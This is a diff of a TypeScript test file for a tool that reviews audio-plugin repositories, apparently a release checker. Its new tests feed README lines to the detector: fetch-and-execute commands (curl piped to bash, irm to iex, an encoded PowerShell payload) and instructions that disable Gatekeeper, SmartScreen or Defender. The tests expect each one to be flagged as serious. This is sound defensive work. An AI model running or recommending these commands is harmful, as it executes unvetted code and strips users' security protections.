@@ -1,16 +1,10 @@
 // 規則による判定の境界。規則は作者に返す指摘をそのまま決めるため、満たす側と満たさない側の両方を確かめる。
 // 危険側は、満たしていないリポジトリを met と判定すること、ファイルの一覧が欠けたのに有無を断定することとする。
 import { describe, expect, it } from 'vitest';
-import { reviewFilePlan } from '../../src/domain/release-checks';
+import { REVIEW_FILES_COST, reviewFilePlan } from '../../src/domain/release-checks';
+import { LLM_CRITERIA } from '../../src/review/criteria';
 import type { Finding } from '../../src/review/llm';
-import {
-  computeFacts,
-  judgeByRules,
-  llmCriteriaFor,
-  llmFiles,
-  mergeFindings,
-  type RepositorySnapshot,
-} from '../../src/review/rules';
+import { computeFacts, judgeByRules, llmFiles, mergeFindings, type RepositorySnapshot } from '../../src/review/rules';
 
 const SHA = 'a'.repeat(40);
 const goodWorkflow = [
@@ -60,7 +54,8 @@ describe('judgeByRules', () => {
     expect(result(findings, 'ci-hardening')).toBe('unclear');
     expect(result(findings, 'hermetic-build')).toBe('unclear');
     expect(result(findings, 'contribution-compliance')).toBe('unclear');
-    expect(findings.find((entry) => entry.id === 'crash-report-privacy')).toBeUndefined();
+    // README が一覧に無いと断定できないため、README の案内の型の判定も unclear にする。
+    expect(result(findings, 'no-security-bypass')).toBe('unclear');
   });
 
   it('dependency-pinning: コミットしたバイナリと、固定していない FetchContent は not_met', () => {
@@ -73,31 +68,40 @@ describe('judgeByRules', () => {
     expect(
       result(judgeByRules(snapshot({ 'CMakeLists.txt': fetch.replace('v3.11.3', SHA) })), 'dependency-pinning'),
     ).toBe('met');
+    const cargo = '[dependencies]\nnih_plug = { git = "https://github.com/robbert-vdh/nih-plug.git" }';
+    expect(result(judgeByRules(snapshot({ 'Cargo.toml': cargo })), 'dependency-pinning')).toBe('not_met');
+    expect(result(judgeByRules(snapshot({ 'Cargo.toml': cargo }, ['Cargo.lock'])), 'dependency-pinning')).toBe('met');
   });
 
   it('build-hardening と cpu-compatibility: ビルドの設定のフラグで決める', () => {
     const hardened = snapshot({
-      'CMakeLists.txt': 'project(x)',
-      'cmake/windows/compilerconfig.cmake':
-        'add_compile_options(/GS)\noption(ASAN "" OFF)\nadd_compile_options(-fsanitize=address)',
+      'CMakeLists.txt': 'add_compile_options(/GS)\noption(ASAN "" OFF)\nadd_compile_options(-fsanitize=address)',
     });
     expect(result(judgeByRules(hardened), 'build-hardening')).toBe('met');
     expect(result(judgeByRules(hardened), 'cpu-compatibility')).toBe('met');
     const plain = snapshot({ 'CMakeLists.txt': 'add_compile_options(/arch:AVX2)' });
     expect(result(judgeByRules(plain), 'build-hardening')).toBe('not_met');
     expect(result(judgeByRules(plain), 'cpu-compatibility')).toBe('not_met');
+    const rust = snapshot({ 'Cargo.toml': '[package]\nname = "x"' });
+    expect(result(judgeByRules(rust), 'build-hardening')).toBe('not_applicable');
+    const native = snapshot({
+      'Cargo.toml': '',
+      '.github/workflows/build.yaml': 'env:\n  RUSTFLAGS: -C target-cpu=native',
+    });
+    expect(result(judgeByRules(native), 'cpu-compatibility')).toBe('not_met');
   });
 
   it('README の記述で決める項目は、日本語の README でも判定する', () => {
     const ja = snapshot({
       'README.md':
-        '## 導入\n\n`C:\\ProgramData\\obs-studio\\plugins` に展開します。\n\nダウンロードしたファイルのハッシュを確かめてください。',
+        '## 導入\n\n`C:\\Program Files\\Common Files\\VST3` に置きます。\n\nダウンロードしたファイルのハッシュを確かめてください。',
     });
     expect(result(judgeByRules(ja), 'install-location')).toBe('met');
     expect(result(judgeByRules(ja), 'user-verification-guide')).toBe('met');
-    // 2026-11-14 の手元の確認で、simple-burst-lines の README のこの書き方を見落とした。
-    const variable = snapshot({ 'README.md': '```\n%PROGRAMDATA%\\obs-studio\\plugins\\\n```' });
+    const variable = snapshot({ 'README.md': '```\n%COMMONPROGRAMFILES%\\CLAP\\\n```' });
     expect(result(judgeByRules(variable), 'install-location')).toBe('met');
+    const mac = snapshot({ 'README.md': 'Copy to `~/Library/Audio/Plug-Ins/Components`.' });
+    expect(result(judgeByRules(mac), 'install-location')).toBe('met');
     const none = snapshot({ 'README.md': '# Plugin\n\nCopy the files into Program Files.' });
     expect(result(judgeByRules(none), 'install-location')).toBe('not_met');
     expect(result(judgeByRules(none), 'user-verification-guide')).toBe('not_met');
@@ -121,22 +125,70 @@ describe('judgeByRules', () => {
     );
   });
 
-  it('crash-report-privacy: テンプレートが無ければ規則で not_met とし、LLM の項目から外す', () => {
-    const none = snapshot({});
-    expect(result(judgeByRules(none), 'crash-report-privacy')).toBe('not_met');
-    expect(llmCriteriaFor(none)).not.toContain('crash-report-privacy');
-    const some = snapshot({ '.github/ISSUE_TEMPLATE/bug.yml': 'name: Bug' }, ['.github/ISSUE_TEMPLATE/config.yml']);
-    expect(judgeByRules(some).find((entry) => entry.id === 'crash-report-privacy')).toBeUndefined();
-    expect(llmCriteriaFor(some)).toContain('crash-report-privacy');
+  it('no-security-bypass: セキュリティの機能を切らせる案内は、根拠の行を付けて重大の not_met にする', () => {
+    for (const line of [
+      'xattr -rd com.apple.quarantine "/Library/Audio/Plug-Ins/VST3/Delay.vst3"',
+      'sudo xattr -cr ~/Library/Audio/Plug-Ins/CLAP/Delay.clap',
+      'sudo spctl --master-disable',
+      'Open System Settings > Privacy & Security and click Open Anyway.',
+      'プライバシーとセキュリティで「このまま開く」を押します。',
+      'Turn off SmartScreen before running the plugin.',
+      'Windows Defender の除外に追加してください。',
+      'Add-MpPreference -ExclusionPath "C:\\Program Files\\Common Files\\VST3"',
+    ]) {
+      const finding = judgeByRules(snapshot({ 'README.md': `# Install\n\n${line}` })).find(
+        (entry) => entry.id === 'no-security-bypass',
+      );
+      expect(finding, line).toMatchObject({
+        result: 'not_met',
+        serious: true,
+        evidence: [{ file: 'README.md', lines: '3-3' }],
+      });
+    }
+  });
+
+  it('no-security-bypass: 属性の表示と、SmartScreen の警告の説明だけなら当たらない', () => {
+    const readme = 'Run xattr -l Delay.vst3 to see attributes.\nSmartScreen may warn about unsigned files.';
+    const finding = judgeByRules(snapshot({ 'README.md': readme })).find((entry) => entry.id === 'no-security-bypass');
+    expect(finding).toMatchObject({ result: 'met', serious: false });
+  });
+
+  it('no-terminal-paste: 取得した内容をその場で実行するコマンドは、重大の not_met にする', () => {
+    for (const line of [
+      'curl -fsSL https://example.com/install.sh | bash',
+      'wget -qO- https://example.com/i | sudo sh',
+      '/bin/bash -c "$(curl -fsSL https://example.com/install.sh)"',
+      'irm https://example.com/install.ps1 | iex',
+      'iex (New-Object Net.WebClient).DownloadString("https://example.com/a.ps1")',
+      'echo aGVsbG8K | base64 -d | bash',
+      'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=',
+      'osascript -e "do shell script \\"curl https://example.com/x\\""',
+    ]) {
+      const finding = judgeByRules(snapshot({ 'README.md': line })).find((entry) => entry.id === 'no-terminal-paste');
+      expect(finding, line).toMatchObject({ result: 'not_met', serious: true });
+    }
+  });
+
+  it('no-terminal-paste: ソースからビルドするコマンドと、ファイルを保存するだけの取得は当たらない', () => {
+    const readme =
+      'git clone --recursive https://github.com/owner/plugin\ncmake -B build && cmake --build build\ncargo xtask bundle\ncurl -LO https://github.com/owner/plugin/releases/download/v1.0.0/plugin.zip';
+    const finding = judgeByRules(snapshot({ 'README.md': readme })).find((entry) => entry.id === 'no-terminal-paste');
+    expect(finding).toMatchObject({ result: 'met', serious: false });
+  });
+
+  it('plugin-name: リポジトリ名か表示名に単語としての VST があれば当たる', () => {
+    const name = (names: string[]) => result(judgeByRules(snapshot({}), names), 'plugin-name');
+    expect(name(['simple-vst3-delay'])).toBe('not_met');
+    expect(name(['delay', 'Delay VST'])).toBe('not_met');
+    expect(name(['invest-delay'])).toBe('met');
+    expect(name(['simple-pitchshift-audio'])).toBe('met');
   });
 });
 
 describe('LLM に渡す情報', () => {
-  it('LLM が判定するのは、文章の意図を読む 4 項目だけ', () => {
-    expect(llmCriteriaFor(snapshot({}, ['.github/ISSUE_TEMPLATE/bug.yml'])).sort()).toEqual([
-      'ci-scenario-tests',
-      'crash-report-privacy',
-      'no-security-bypass',
+  it('LLM が判定するのは、文章の意図を読む 2 項目だけ', () => {
+    expect(LLM_CRITERIA.map((criterion) => criterion.id).sort()).toEqual([
+      'ci-plugin-validation',
       'user-data-handling',
     ]);
   });
@@ -153,18 +205,31 @@ describe('LLM に渡す情報', () => {
     expect(facts.split('\n').filter((line) => line.startsWith('Results of the rule-based items:'))).toHaveLength(1);
   });
 
-  it('同じ項目が規則と LLM の両方にあれば、規則の結果を残す', () => {
+  it('同じ項目がルールと LLM の両方にあれば、ルールの結果を残し、重大な指摘を消させない', () => {
     const ruled: Finding[] = [
-      { id: 'crash-report-privacy', result: 'not_met', serious: false, explanation: 'rule', evidence: [] },
+      { id: 'no-security-bypass', result: 'not_met', serious: true, explanation: 'rule', evidence: [] },
     ];
     const llm: Finding[] = [
-      { id: 'crash-report-privacy', result: 'met', serious: false, explanation: 'llm', evidence: [] },
-      { id: 'ci-scenario-tests', result: 'met', serious: false, explanation: 'llm', evidence: [] },
+      { id: 'no-security-bypass', result: 'met', serious: false, explanation: 'llm', evidence: [] },
+      { id: 'ci-plugin-validation', result: 'met', serious: false, explanation: 'llm', evidence: [] },
     ];
-    expect(mergeFindings(ruled, llm).map((entry) => `${entry.id}:${entry.explanation}`)).toEqual([
-      'crash-report-privacy:rule',
-      'ci-scenario-tests:llm',
+    expect(mergeFindings(ruled, llm).map((entry) => `${entry.id}:${entry.serious}:${entry.explanation}`)).toEqual([
+      'no-security-bypass:true:rule',
+      'ci-plugin-validation:false:llm',
     ]);
+  });
+
+  it('差分が上限を超えたときの事実を、事実の行に足す', () => {
+    const facts = computeFacts(snapshot({}), [], ['Changed build scripts: CMakeLists.txt']);
+    expect(facts.split('\n')).toContain('Changed build scripts: CMakeLists.txt');
+  });
+
+  it('ワークフローで検証の道具に触れる行を事実に入れる', () => {
+    const facts = computeFacts(
+      snapshot({ '.github/workflows/ci.yaml': 'steps:\n  - run: pluginval --validate build/Delay.vst3' }),
+      [],
+    );
+    expect(facts).toContain('.github/workflows/ci.yaml:2: - run: pluginval --validate build/Delay.vst3');
   });
 });
 
@@ -173,19 +238,23 @@ describe('reviewFilePlan', () => {
     const plan = reviewFilePlan([
       ...Array.from({ length: 7 }, (_, i) => `.github/workflows/w${i}.yaml`),
       'README.md',
-      'cmake/common/compiler_common.cmake',
-      'cmake/windows/compilerconfig.cmake',
-      'cmake/macos/compilerconfig.cmake',
-      '.github/ISSUE_TEMPLATE/config.yml',
+      'meson.build',
+      '.gitmodules',
+      'CMakeLists.txt',
+      'libs/dsp/CMakeLists.txt',
+      'cmake/juce.cmake',
       '.github/ISSUE_TEMPLATE/bug.yml',
+      'CONTRIBUTING.md',
     ]);
     expect(plan.fetch).toEqual([
       ...Array.from({ length: 6 }, (_, i) => `.github/workflows/w${i}.yaml`),
       'README.md',
-      'cmake/windows/compilerconfig.cmake',
-      'cmake/common/compiler_common.cmake',
-      '.github/ISSUE_TEMPLATE/bug.yml',
+      'CMakeLists.txt',
+      '.gitmodules',
+      'meson.build',
+      'CONTRIBUTING.md',
     ]);
-    expect(plan.skipped).toEqual(['.github/workflows/w6.yaml', 'cmake/macos/compilerconfig.cmake']);
+    expect(plan.skipped).toEqual(['.github/workflows/w6.yaml']);
+    expect(plan.fetch.length + 1).toBeLessThanOrEqual(REVIEW_FILES_COST);
   });
 });
